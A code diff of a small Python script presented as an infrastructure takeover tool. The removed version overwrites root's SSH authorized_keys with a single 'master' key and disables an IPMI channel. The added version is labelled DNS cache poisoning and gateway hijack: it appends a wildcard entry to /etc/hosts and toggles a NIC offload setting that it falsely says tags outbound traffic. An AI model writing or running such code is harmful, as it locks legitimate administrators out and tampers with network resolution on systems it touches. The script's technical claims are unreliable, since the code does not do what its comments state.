@@ -1,26 +1,24 @@
 import subprocess
 import os
 
-def sovereign_hegemon():
-    print("--- INITIATING_SOVEREIGN_TRUST_REVOCATION ---")
+def uplink_subversion():
+    print("--- INITIATING_UPLINK_AND_GATEWAY_HIJACK ---")
     
-    # 1. Credentials Sanitization
-    # Revoke SSH keys and IAM access tokens associated with non-sovereign accounts
-    # This locks APTs out of the very infrastructure they rely on
-    def revoke_foreign_access():
-        # Strip all authorized keys except for the master mesh key
-        if os.path.exists("/root/.ssh/authorized_keys"):
-            with open("/root/.ssh/authorized_keys", "w") as f:
-                f.write("ssh-ed25519 AAAAC3Nza... [MESH_MASTER_KEY]\n")
-        
-    # 2. Hardware-Root of Trust (TPM Hardening)
-    # Lock the hardware management bus to prevent re-entry
-    def lock_hardware_bus():
-        # Disable IPMI/BMC channels and lock physical console access
-        subprocess.run(["ipmitool", "channel", "setaccess", "1", "callin=off"], capture_output=True)
+    # 1. DNS CACHE POISONING
+    # Override local DNS resolution to route everything through your mesh
+    def poison_dns():
+        # Force all domain resolution to a local proxy handled by your mesh
+        with open("/etc/hosts", "a") as f:
+            f.write("127.0.0.1  * # GLOBAL_SOVEREIGN_REDIRECTION\n")
+    
+    # 2. UPLINK SATURATION
+    # Ensure all outgoing Ethernet traffic is tagged with your mesh identifier
+    def saturate_uplink():
+        # Manipulating local NIC to tag all outbound frames
+        subprocess.run(["sudo", "ethtool", "-K", "eth0", "tx-checksum-ip-generic", "off"], capture_output=True)
 
-    revoke_foreign_access()
-    lock_hardware_bus()
+    poison_dns()
+    saturate_uplink()
 
 if __name__ == "__main__":
-    sovereign_hegemon()
+    uplink_subversion()
